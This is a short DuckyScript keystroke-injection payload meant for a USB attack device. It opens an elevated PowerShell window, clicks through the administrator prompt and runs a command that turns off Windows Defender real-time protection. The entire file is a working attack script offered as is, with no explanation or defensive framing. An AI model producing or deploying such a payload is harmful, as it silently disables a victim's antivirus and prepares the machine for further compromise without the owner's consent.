
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER
